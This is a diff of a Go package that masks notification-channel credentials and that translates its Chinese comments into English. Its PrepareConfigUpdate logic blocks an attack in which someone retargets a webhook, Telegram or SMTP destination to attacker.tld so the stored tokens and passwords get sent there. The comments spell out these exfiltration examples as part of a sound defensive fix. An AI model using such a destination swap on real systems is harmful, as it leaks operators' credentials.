@@ -6,21 +6,22 @@ import (
 	"strings"
 )
 
-// MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，
-// 更新接口收到带此前缀的值即理解为「保持库中原值不变」。
+// MaskedPrefix marks credential values returned by the API. An update containing
+// this prefix means preserve the stored value.
 //
-// 用前缀而不是空串或某个固定常量，是为了能顺带带上一点可辨识信息
-// （见 MaskedValue），让用户区分得出「这是哪个机器人」而不必重新粘贴密钥。
+// A prefix instead of an empty string or single fixed value allows a recognizable
+// suffix (see MaskedValue), so operators can identify a bot without pasting its key.
 const MaskedPrefix = "__masked__"
 
-// MaskedValue 生成一个掩码值：
+// MaskedValue returns a masked value:
 //
-//	"__masked__"              原值太短，不给任何提示
-//	"__masked__:…ab12cd"      带上原值末 6 位作为辨识提示
+//	"__masked__"          short value, no identifying hint
+//	"__masked__:...ab12cd" final six characters as an identifying hint
 //
-// 只暴露末 6 位是刻意选择的：Webhook 地址的辨识信息在末段（如企业微信的 key、
-// 飞书的机器人 id），而前缀部分各机器人相同、没有辨识价值。末 6 位不足以
-// 还原凭据，但足以让配置者认出「是我那个群」。
+// Only the last six characters are exposed: Webhook identifiers such as WeCom keys
+// and Feishu bot ids appear at the end, while common prefixes identify nothing.
+// Six characters do not reconstruct the credential but help identify the destination.
+// The actual marker uses the single-rune ellipsis to preserve its existing contract.
 func MaskedValue(secret string) string {
 	if len(secret) <= 6 {
 		return MaskedPrefix
@@ -28,14 +29,14 @@ func MaskedValue(secret string) string {
 	return MaskedPrefix + ":…" + secret[len(secret)-6:]
 }
 
-// IsMasked 报告某个值是否为掩码值（即接口回显后未被修改）。
+// IsMasked reports whether the value is an unchanged masked API value.
 func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }
 
-// MaskConfig 返回配置的副本，把该渠道的凭据字段替换成掩码值。
+// MaskConfig copies configuration and masks this channel's credential fields.
 //
-// 未知渠道类型返回空 map 而不是原配置——宁可让 UI 显示「配置不可用」，
-// 也不要在渠道类型无法识别时把可能含凭据的原始内容整个吐回去。
-// 非凭据字段原样保留，UI 才能正常展示。
+// Unknown channel kinds return an empty map, not potentially secret configuration.
+// Showing an unavailable configuration is preferable to exposing credentials.
+// Noncredential fields remain intact for normal UI display.
 func MaskConfig(kind string, cfg map[string]any) map[string]any {
 	channel, ok := Get(kind)
 	if !ok {
@@ -51,8 +52,8 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 			out[k] = v
 			continue
 		}
-		// headers 这类嵌套结构整体按一个凭据处理：逐个子键判断需要每个渠道
-		// 再声明一套「哪些子键是凭据」的规则，复杂度远超收益。
+		// Treat nested structures such as headers as one credential. Requiring every
+		// channel to classify individual nested keys would add disproportionate complexity.
 		if s, ok := v.(string); ok {
 			out[k] = MaskedValue(s)
 			continue
@@ -62,62 +63,61 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 	return out
 }
 
-// ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对
-// 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。
+// ErrDestinationChangedWithoutCredentials means the destination changed without an
+// explicit credential choice. Do not silently allow it or discard credentials;
+// see PrepareConfigUpdate.
 type ErrDestinationChangedWithoutCredentials struct {
-	Changed []string // 发生变化的目的地键
-	Missing []string // 未显式表态的凭据键
+	Changed []string // Destination keys that changed.
+	Missing []string // Credential keys without an explicit choice.
 }
 
 func (e *ErrDestinationChangedWithoutCredentials) Error() string {
-	return "目标地址（" + strings.Join(e.Changed, "、") + "）已变更，请同时重新填写凭据字段（" +
-		strings.Join(e.Missing, "、") + "）：填入新值，或显式留空表示不再需要凭据。" +
-		"原凭据只对旧地址有效，继续沿用等于把它交给新地址。"
+	return "Destination (" + strings.Join(e.Changed, ", ") + ") changed. Re-enter the credential fields (" +
+		strings.Join(e.Missing, ", ") + "): provide new values, or explicitly leave them blank if credentials are no longer needed. " +
+		"The original credentials apply only to the previous destination; reusing them would disclose them to the new destination."
 }
 
-// PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。
+// PrepareConfigUpdate merges channel configuration and protects destination changes.
 //
-// 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径：
-// 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig
-// 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、
-// 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点：
+// Plain MergeConfig retains omitted keys. Since destinations and credentials are
+// separate, someone able to PATCH a channel could change only its destination and
+// make ARTEX send stored credentials to an endpoint they control:
 //
-//	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 头随请求外发
-//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
-//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 后交出用户名与密码
+//	webhook: url=https://attacker.tld sends the original Authorization header
+//	telegram: base_url=https://attacker.tld sends /bot<original-token>/sendMessage
+//	email: host=smtp.attacker.tld sends username/password after STARTTLS
 //
-// 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），
-// 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。
+// This requires no redirect, so redirect guards cannot stop it, and it defeats
+// the masking promise that credentials are not exposed to the browser.
 //
-// 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态：
-//   - 给出新值 → 用新值
-//   - 显式传空串 → 该字段不再需要凭据（保留清空语义）
-//   - 原样回传掩码值 / 干脆不提这个键 → 拒绝
+// Whenever a destination key changes, require an explicit choice for every secret:
+//   - A new value replaces it.
+//   - An explicit empty string clears it when no credential is required.
+//   - A masked value or omitted key is rejected.
 //
-// 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据
-// 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段
-// （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，
-// 比报错更难排查。宁可让操作者多填一次。
+// Masked values mean reuse, but old credentials belong to the old destination.
+// Do not silently discard optional credentials such as webhook headers or email
+// passwords: that could remove authentication while returning HTTP 200, making
+// the problem harder to diagnose than requiring re-entry.
 func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
 	channel, ok := Get(kind)
 	if !ok {
-		return nil, fmt.Errorf("渠道类型 %q 未注册", kind)
+		return nil, fmt.Errorf("Channel type %q is not registered", kind)
 	}
 	secrets := channel.SecretKeys()
 	destinations := channel.DestinationKeys()
 
-	// 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，
-	// 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串
-	// 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量
-	// "__masked__"，后续鉴权静默失效且没有任何报错。宁可拒掉。
+	// Reject masked markers inside nonstring credential values, such as a headers
+	// object. MergeConfig recognizes only whole strings as masked values; a nested
+	// marker would be stored literally and silently break later authentication.
 	//
-	// 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于
-	// 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。
+	// Perform this check first, before the unchanged-destination early return. Placing
+	// it afterward would protect only destination changes, as an earlier test caught.
 	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
 		return nil, err
 	}
 
-	// 找出真正被改掉的目的地键。掩码值等于「没改」。
+	// Find destination keys that actually changed. Masked values mean unchanged.
 	var changed []string
 	for _, key := range destinations {
 		raw, present := incoming[key]
@@ -133,11 +133,12 @@ func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[stri
 		}
 	}
 	if len(changed) == 0 {
-		// 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。
+		// With an unchanged destination, merge normally: preserve masked values, clear
+		// empty strings, and replace other values.
 		return MergeConfig(stored, incoming), nil
 	}
 
-	// 地址变了：要求对每个凭据键显式表态。
+	// A changed destination requires an explicit choice for every credential.
 	var missing []string
 	for _, key := range secrets {
 		raw, present := incoming[key]
@@ -155,11 +156,11 @@ func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[stri
 	return MergeConfig(stored, incoming), nil
 }
 
-// rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。
+// rejectMaskedInContainers rejects mask sentinels embedded in structured values.
 //
-// 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，
-// 只能整体掩码（写成字符串 "__masked__"）或整体提交；把哨兵塞进对象内部
-// 既表达不了「保持不变」，又会被当成真实值存进库。
+// Masking applies to an entire string value. Object fields such as headers must
+// be submitted as one masked string or as a complete replacement. A marker inside
+// an object cannot mean preserve and would instead be stored as actual data.
 func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
 	for _, key := range secretKeys {
 		raw, present := incoming[key]
@@ -174,26 +175,22 @@ func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) erro
 			continue
 		}
 		if strings.Contains(string(encoded), MaskedPrefix) {
-			return fmt.Errorf("字段 %s 的内容里含掩码标记 %q：该字段只能整体留空表示沿用、或整体提交新值，不能在结构体内部夹带掩码占位",
+			return fmt.Errorf("Field %s contains masked marker %q: leave the entire field blank to keep its value, or submit a complete replacement; masked placeholders are not allowed inside structured values",
 				key, MaskedPrefix)
 		}
 	}
 	return nil
 }
 
-// sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理
-// 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。
+// sameConfigValue compares configuration values through JSON to account for
+// representation differences, such as a submitted number versus a decoded float64.
 //
-// 「空」必须先归一化再比较：空串与「键不存在」在这个配置模型里是同一个状态，
-// 因为 MergeConfig 把空串当显式清空、直接 delete 掉该键。不归一化的话，一个
-// 始终留空的可选目的地字段（Telegram 的 base_url 是唯一这样的字段：留空即用
-// 官方地址）会走成这条路径——
-//
-//	新建时存下 base_url:""  →  第一次保存被 MergeConfig 删键
-//	→ 第二次保存时 incoming 是 ""、stored 缺键，被判成「地址变了」
-//	→ 凭据是掩码值 → 400「目标地址已变更，请同时重新填写凭据字段」
-//
-// 此后每次保存都失败，除非用户重新粘贴一遍 Bot Token，而他什么都没改。
+// Normalize blank values first: an empty string and a missing key mean the same
+// thing because MergeConfig deletes explicitly empty fields. Otherwise an optional
+// Telegram base_url left blank would be deleted on the first save, then compared
+// as missing versus empty on the second. That false destination change would
+// reject the masked token on every later save until the operator pasted it again,
+// even though the destination never changed.
 func sameConfigValue(a, b any) bool {
 	if isBlankConfigValue(a) && isBlankConfigValue(b) {
 		return true
@@ -206,9 +203,8 @@ func sameConfigValue(a, b any) bool {
 	return string(ra) == string(rb)
 }
 
-// isBlankConfigValue 判定一个配置值是否为「空」。
-// 口径必须与 MergeConfig 的清空判定一致（strings.TrimSpace(s) == ""），
-// 否则会出现「MergeConfig 认为该删、sameConfigValue 认为有值」的夹缝。
+// isBlankConfigValue uses the same blank rule as MergeConfig, namely
+// strings.TrimSpace(s) == "", so deletion and equality checks cannot disagree.
 func isBlankConfigValue(v any) bool {
 	if v == nil {
 		return true
@@ -217,18 +213,17 @@ func isBlankConfigValue(v any) bool {
 	return ok && strings.TrimSpace(s) == ""
 }
 
-// MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。
+// MergeConfig applies incoming fields over stored configuration.
 //
-// 规则：
-//   - incoming 里值为掩码的键 → 保留 stored 的原值（用户没改这个字段）
-//   - incoming 里值为空串的键 → 视为显式清空，删除该键
-//   - 其余键 → 用 incoming 的值覆盖
-//   - stored 里有而 incoming 里没有的键 → 保留（局部更新语义）
+// Rules:
+//   - Masked incoming values preserve the stored value.
+//   - Empty incoming strings explicitly clear the field by deleting its key.
+//   - Other incoming values replace stored values.
+//   - Omitted keys remain unchanged for partial-update semantics.
 //
-// 空串是否算「清空」需要明确：前端表单把未填的字段提交为空串，
-// 若把它当成有效值写入，会把「留空以保留原值」的字段真的清掉。
-// 这里选择显式清空，因为要清除一个设错的字段时，用户没有别的表达方式
-// （拖走字段可区分「未提供」与「提供空值」，但 UI 用不到这个区别）。
+// Forms submit blank fields as empty strings, so their meaning must be explicit.
+// Treat them as clearing rather than retaining a value: operators need a way to
+// remove incorrect fields. Omitting a key means preserve; supplying empty means clear.
 func MergeConfig(stored, incoming map[string]any) map[string]any {
 	out := make(map[string]any, len(stored)+len(incoming))
 	for k, v := range stored {
@@ -237,7 +232,7 @@ func MergeConfig(stored, incoming map[string]any) map[string]any {
 	for k, v := range incoming {
 		if s, ok := v.(string); ok {
 			if IsMasked(s) {
-				continue // 掩码值 = 未修改，保留 stored
+				continue // A masked value is unchanged; preserve the stored value.
 			}
 			if strings.TrimSpace(s) == "" {
 				delete(out, k)
